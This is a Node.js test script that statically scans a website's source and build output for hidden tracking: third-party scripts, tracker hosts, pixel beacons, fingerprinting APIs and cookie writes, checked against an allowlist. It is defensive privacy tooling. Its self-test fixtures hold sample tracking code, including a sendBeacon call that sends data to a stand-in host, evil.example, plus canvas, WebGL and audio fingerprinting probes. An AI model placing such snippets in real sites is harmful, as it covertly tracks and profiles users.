// CT8 gate: no hidden tracking. Static scan of app/, components/ (and a built out/ dir via --built <dir>) for
// third-party script tags, pixel/beacon URLs, fingerprinting APIs and cookie writes, against scripts/no_tracking_allowlist.json.
// No network. Usage: node scripts/test_no_hidden_tracking.mjs [--built out] [--root <dir>] [--allowlist <file>] [--list]
import { readFileSync, readdirSync, statSync, existsSync } from "node:fs";
import { join, relative, resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const argv = process.argv.slice(2);
const opt = (n, d) => { const i = argv.indexOf(n); return i >= 0 && argv[i + 1] ? argv[i + 1] : d; };
const ROOT = resolve(opt("--root", join(HERE, "..")));
const ALLOW = resolve(opt("--allowlist", join(HERE, "no_tracking_allowlist.json")));
const BUILT = opt("--built", null);
const SELFTEST = !argv.includes("--no-selftest") && !opt("--root", null);

// Hosts we treat as trackers wherever they appear as a URL in source.
const TRACKER_HOSTS = "google-analytics\\.com|googletagmanager\\.com|googletagservices\\.com|doubleclick\\.net|googlesyndication\\.com|facebook\\.net|facebook\\.com/tr|connect\\.facebook|hotjar\\.com|clarity\\.ms|segment\\.(?:io|com)|mixpanel\\.com|amplitude\\.com|fullstory\\.com|heap(?:analytics)?\\.(?:io|com)|plausible\\.io|posthog\\.com|sentry\\.io|intercom\\.io|hubspot\\.com|hs-scripts\\.com|linkedin\\.com/px|snap\\.licdn\\.com|ads-twitter\\.com|analytics\\.twitter\\.com|tiktok\\.com/i18n/pixel|bat\\.bing\\.com|cloudflareinsights\\.com|matomo|fingerprint(?:js|\\.com)|fpjs\\.io|crisp\\.chat|tawk\\.to|drift\\.com|newrelic\\.com|datadoghq\\.com";

const RULES = [
  { rule: "third-party-script", re: /<script\b[^>]*\bsrc\s*=\s*["'`{]*\s*["'`]?(https?:)?\/\/(?!(?:www\.)?titanos\.tech)[^\s"'`>]+/i, why: "third-party <script src>" },
  { rule: "third-party-script", re: /<Script\b[^>]*\bsrc\s*=\s*["'`{]*\s*["'`]?(https?:)?\/\/(?!(?:www\.)?titanos\.tech)[^\s"'`>]+/, why: "third-party next/script src" },
  { rule: "third-party-script", re: /createElement\(\s*["'`]script["'`]\s*\)/, why: "dynamic script injection" },
  { rule: "third-party-script", re: /\bimportScripts\s*\(\s*["'`]https?:/, why: "importScripts of a remote URL" },
  { rule: "tracker-host", re: new RegExp(`(?:https?:)?//[a-z0-9.-]*(?:${TRACKER_HOSTS})`, "i"), why: "known tracker host" },
  { rule: "beacon", re: /\bsendBeacon\s*\(/, why: "navigator.sendBeacon" },
  { rule: "beacon", re: /\bnew\s+Image\s*\(\s*[^)]*\)\s*\.src\s*=|\.src\s*=\s*["'`]https?:\/\/[^"'`]*(?:pixel|track|beacon|collect|\bpx\b)/i, why: "image-pixel beacon" },
  { rule: "beacon-url", re: /["'`]https?:\/\/[^"'`\s]*(?:\/pixel\b|\/track(?:ing)?\b|\/beacon\b|\/collect\b|\/site-event\b|\/__utm\.gif|\/tr\?id=)[^"'`\s]*/i, why: "pixel/beacon-style URL" },
  { rule: "fingerprint", re: /\btoDataURL\s*\(|\bgetImageData\s*\(|\btoBlob\s*\(\s*[^)]*\)\s*.*canvas/, why: "canvas read-back (canvas fingerprinting)" },
  { rule: "fingerprint", re: /\b(?:Offline)?AudioContext\b|\bwebkitAudioContext\b|\bcreateOscillator\b/, why: "audio-context fingerprinting surface" },
  { rule: "fingerprint", re: /UNMASKED_(?:RENDERER|VENDOR)_WEBGL|WEBGL_debug_renderer_info|getParameter\(\s*3744[56]\s*\)/, why: "WebGL renderer/vendor probe" },
  { rule: "fingerprint", re: /navigator\.(?:plugins|mimeTypes|hardwareConcurrency|deviceMemory|getBattery|userAgentData|connection)\b|\benumerateDevices\s*\(|\bscreen\.(?:colorDepth|pixelDepth)\b|\bgetClientRects\b.*font|\bdocument\.fonts\.check\s*\(/, why: "device-attribute probe" },
  { rule: "fingerprint", re: /fingerprintjs|\bclientjs\b|\bevercookie\b|\bmurmurhash/i, why: "fingerprinting library" },
  { rule: "cookie-write", re: /\bdocument\.cookie\s*=(?!=)/, why: "document.cookie write" },
  { rule: "cookie-write", re: /\bcookieStore\.set\s*\(/, why: "cookieStore.set" },
  { rule: "cookie-write", re: /\bset-cookie\b|\.cookies\.set\s*\(|\bcookies\(\)\.set\b/i, why: "Set-Cookie / cookies().set" },
  { rule: "cookie-write", re: /\bdocument\.cookie\b(?!\s*[=!]=)(?!\s*=[^=])/, why: "document.cookie access (read or write)" },
];

const SRC_EXT = /\.(?:tsx?|jsx?|mjs|cjs|html?)$/;
const SKIP_DIR = new Set(["node_modules", ".next", ".git"]);

function walk(dir, out = []) {
  if (!existsSync(dir)) return out;
  for (const n of readdirSync(dir)) {
    if (SKIP_DIR.has(n)) continue;
    const p = join(dir, n);
    const st = statSync(p);
    if (st.isDirectory()) walk(p, out);
    else if (SRC_EXT.test(n)) out.push(p);
  }
  return out;
}

// CSP allowance (f294): a tracker host that sits inside a Content-Security-Policy directive value is a permission, not a
// loaded tag. It is ALLOWED only when (a) the text before the host is "<directive> <source tokens>" with no tag/attribute/call
// punctuation (< > = ( ) quote ; backslash), so <script src=..>, <img src=..>, fetch("..") never qualify, and (b) the host
// is on the allowlist's csp_allowed_hosts. Any other tracker host in CSP text still FAILS.
const CSP_PREFIX = /(?:^|[\s"'`:,{])(?:default|script|style|img|font|connect|media|object|child|frame|worker|manifest|prefetch)-src(?:-elem|-attr)?\s+[^;<>=()"`\\]*$/i;
const CSP_PREFIX_FORM = /(?:^|[\s"'`:,{])(?:form-action|base-uri|frame-ancestors)\s+[^;<>=()"`\\]*$/i;
const TRACKER_HOST_G = new RegExp(`(?:https?:)?//[a-z0-9.-]*(?:${TRACKER_HOSTS})`, "gi");
const unent = (t) => t.replace(/&#x27;|&#39;|&apos;/g, "'").replace(/&quot;/g, '"').replace(/&amp;/g, "&");

export function cspClassify(line, idx, cspHosts) {
  const text = unent(line.slice(0, idx));
  const tail = text.slice(Math.max(0, text.length - 600));
  if (!(CSP_PREFIX.test(tail) || CSP_PREFIX_FORM.test(tail))) return null;
  const host = (unent(line.slice(idx)).match(/^(?:https?:)?\/\/([a-z0-9.-]+)/i) || [])[1] || "";
  const hit = (cspHosts || []).find((h) => host === h.host || host.endsWith("." + h.host));
  return hit ? { host, reason: hit.reason } : null;
}

export function scanText(rel, text, opts = {}) {
  const found = [];
  const lines = text.split("\n");
  lines.forEach((line, i) => {
    // Built chunks are minified into few huge lines: report a 160-char window around the hit.
    for (const r of RULES) {
      let m;
      if (r.rule === "tracker-host") {
        // every occurrence on the line: a CSP mention must not hide a real tag later on the same (minified) line
        TRACKER_HOST_G.lastIndex = 0;
        let badM = null;
        for (const mm of line.matchAll(TRACKER_HOST_G)) {
          const c = cspClassify(line, mm.index, opts.cspHosts);
          if (c) { if (opts.cspOut) opts.cspOut.push({ file: rel, line: i + 1, host: c.host, reason: c.reason }); }
          else if (!badM) badM = mm;
        }
        m = badM;
      } else m = r.re.exec(line);
      if (!m) continue;
      const snippet = line.length > 220 ? line.slice(Math.max(0, m.index - 60), m.index + 100) : line.trim();
      found.push({ file: rel, line: i + 1, rule: r.rule, why: r.why, text: snippet.trim() });
    }
  });
  return found;
}

export function scanTree(dirs, root, opts = {}) {
  const all = [];
  for (const d of dirs) for (const f of walk(d)) all.push(...scanText(relative(root, f), readFileSync(f, "utf8"), opts));
  // one finding per (file,line,rule): several regexes can hit the same line for the same reason
  const seen = new Set();
  return all.filter((f) => { const k = `${f.file}:${f.line}:${f.rule}`; if (seen.has(k)) return false; seen.add(k); return true; });
}

export function applyAllow(findings, allow) {
  const used = new Set();
  const bad = findings.filter((f) => {
    const hit = allow.findIndex((a) => a.rule === f.rule && (a.file.endsWith("/") ? f.file.startsWith(a.file) : f.file.endsWith(a.file)) && f.text.includes(a.match));
    if (hit >= 0) { used.add(hit); return false; }
    return true;
  });
  return { bad, unused: allow.map((a, i) => (used.has(i) ? null : a)).filter(Boolean) };
}

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log("PASS " + m); } else { fail++; console.log("FAIL " + m); } };

// ---- SELF-TEST: planted trackers must fail the gate; clean + allowlisted code must pass ----
if (SELFTEST) {
  const planted = {
    "app/x.tsx": `export default () => <script src="https://www.googletagmanager.com/gtag/js?id=G-1" />;`,
    "components/y.tsx": `import Script from "next/script";\nexport const Y = () => <Script src="https://cdn.example.com/t.js" />;`,
    "components/z.tsx": `new Image().src = "https://px.example.com/pixel?u=1";`,
    "components/w.tsx": `const c = document.createElement("canvas"); const d = c.toDataURL();`,
    "components/v.tsx": `document.cookie = "uid=1; path=/";`,
    "components/u.tsx": `navigator.sendBeacon("https://evil.example/collect", "x");`,
    "components/t.tsx": `const g = gl.getParameter(37446); const h = navigator.hardwareConcurrency;`,
    "components/s.tsx": `new (window.AudioContext)();`,
  };
  const rulesNeeded = { "app/x.tsx": "third-party-script", "components/y.tsx": "third-party-script", "components/z.tsx": "beacon", "components/w.tsx": "fingerprint", "components/v.tsx": "cookie-write", "components/u.tsx": "beacon", "components/t.tsx": "fingerprint", "components/s.tsx": "fingerprint" };
  for (const [f, src] of Object.entries(planted)) {
    const r = scanText(f, src);
    ok(r.some((x) => x.rule === rulesNeeded[f]), `fixture ${f} planted ${rulesNeeded[f]} is caught`);
    ok(applyAllow(r, []).bad.length > 0, `fixture ${f} fails the gate with an empty allowlist`);
  }
  const clean = `export default function A(){ return <a href="https://titanos.tech/x">hi</a>; }`;
  ok(scanText("components/clean.tsx", clean).length === 0, "clean first-party component yields zero findings");
  const f179 = `navigator.sendBeacon("https://vault.titanos.tech/api/site-event", b);`;
  const fl = scanText("components/SiteAnalytics.tsx", f179);
  ok(fl.length > 0 && applyAllow(fl, [{ rule: "beacon", file: "components/SiteAnalytics.tsx", match: "sendBeacon" }, { rule: "beacon-url", file: "components/SiteAnalytics.tsx", match: "site-event" }]).bad.length === 0, "named f179 beacon passes only via an explicit allowlist entry");
  ok(applyAllow(scanText("components/Other.tsx", f179), [{ rule: "beacon", file: "components/SiteAnalytics.tsx", match: "sendBeacon" }]).bad.length > 0, "the f179 allowance does not cover the same call in another file");
  ok(applyAllow([{ file: "out/_next/static/chunks/a.js", rule: "beacon", text: "navigator.sendBeacon(" }], [{ rule: "beacon", file: "out/_next/static/chunks/", match: "sendBeacon" }]).bad.length === 0 && applyAllow([{ file: "out/x.html", rule: "beacon", text: "navigator.sendBeacon(" }], [{ rule: "beacon", file: "out/_next/static/chunks/", match: "sendBeacon" }]).bad.length > 0, "f294 a directory-scoped allowance (path ending /) covers only that directory");
  // f294 CSP allowance: CSP text passes only for a listed host; real tags and unlisted hosts still fail
  const CH = [{ host: "cloudflareinsights.com", reason: "test" }];
  const csp = `<meta http-equiv="Content-Security-Policy" content="default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://static.cloudflareinsights.com; connect-src &#x27;self&#x27; https://cloudflareinsights.com"/>`;
  const cspOut = [];
  ok(scanText("out/a.html", csp, { cspHosts: CH, cspOut }).length === 0 && cspOut.length === 2, "f294 CSP meta mentioning a listed host is ALLOWED and reported with its reason");
  ok(scanText("out/a.html", `{"c":"default-src 'self'; script-src 'self' https://static.cloudflareinsights.com;"}`, { cspHosts: CH }).length === 0, "f294 CSP inside RSC JSON text is ALLOWED");
  ok(scanText("out/b.html", `<script src="https://static.cloudflareinsights.com/beacon.min.js" defer></script>`, { cspHosts: CH }).some((x) => x.rule === "tracker-host"), "f294 a real <script src=cloudflareinsights> still FAILS");
  ok(scanText("out/b.html", `<img src="https://static.cloudflareinsights.com/p.gif">`, { cspHosts: CH }).length > 0, "f294 a real <img src=cloudflareinsights> still FAILS");
  ok(scanText("out/b.html", `<link rel="preconnect" href="https://static.cloudflareinsights.com">`, { cspHosts: CH }).length > 0, "f294 a <link href=cloudflareinsights> still FAILS");
  ok(scanText("out/b.html", `<iframe src="https://static.cloudflareinsights.com/x"></iframe>`, { cspHosts: CH }).length > 0, "f294 an <iframe src=cloudflareinsights> still FAILS");
  ok(scanText("out/b.js", `fetch("https://cloudflareinsights.com/cdn-cgi/rum", {method:"POST"})`, { cspHosts: CH }).length > 0, "f294 a fetch() to cloudflareinsights still FAILS");
  ok(scanText("out/c.html", `<meta http-equiv="Content-Security-Policy" content="script-src &#x27;self&#x27; https://www.google-analytics.com"/>`, { cspHosts: CH }).length > 0, "f294 an UNLISTED tracker host inside CSP text still FAILS");
  ok(scanText("out/d.html", csp + `<script src="https://static.cloudflareinsights.com/beacon.min.js"></script>`, { cspHosts: CH }).length > 0, "f294 a CSP mention does not hide a real tag later on the same minified line");
  ok(scanText("out/e.html", csp, {}).length > 0, "f294 with no csp_allowed_hosts the same CSP text fails (default closed)");
}

// ---- REAL SCAN ----
const dirs = [join(ROOT, "app"), join(ROOT, "components")];
if (BUILT) dirs.push(resolve(ROOT, BUILT));
const allowDoc = JSON.parse(readFileSync(ALLOW, "utf8"));
ok(allowDoc.allow.every((a) => a.id && a.rule && a.file && a.match && a.reason), "every allowlist entry names id, rule, file, match and reason");
ok(allowDoc.allow.some((a) => a.id === "f179"), "allowlist names the first-party f179 beacon");
const cspHosts = allowDoc.csp_allowed_hosts || [];
ok(cspHosts.every((h) => h.host && h.reason), "every csp_allowed_hosts entry names host and reason");
const cspOut = [];
const findings = scanTree(dirs, ROOT, { cspHosts, cspOut });
if (cspOut.length) {
  const byHost = {};
  for (const c of cspOut) (byHost[c.host] ||= { n: 0, files: new Set(), reason: c.reason }, byHost[c.host].n++, byHost[c.host].files.add(c.file));
  for (const [h, v] of Object.entries(byHost)) console.log(`ALLOWED-CSP ${h} x${v.n} in ${v.files.size} files: CSP allowlist text, not a loaded tag. ${v.reason}`);
}
const { bad, unused } = applyAllow(findings, allowDoc.allow);
console.log(`scanned: ${dirs.map((d) => relative(ROOT, d) || ".").join(", ")} | raw findings ${findings.length} | allowlisted ${findings.length - bad.length} | unlisted ${bad.length}`);
if (argv.includes("--list")) for (const f of findings) console.log(`FINDING ${f.file}:${f.line} [${f.rule}] ${f.why} :: ${f.text.slice(0, 120)}`);
for (const f of bad) console.log(`UNLISTED ${f.file}:${f.line} [${f.rule}] ${f.why} :: ${f.text.slice(0, 120)}`);
ok(bad.length === 0, `no unlisted tracking finding in ${dirs.length} scanned roots`);
ok(unused.length === 0, "no stale allowlist entry" + (unused.length ? " :: " + unused.map((u) => u.id + "/" + u.rule).join(",") : ""));
console.log(`${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
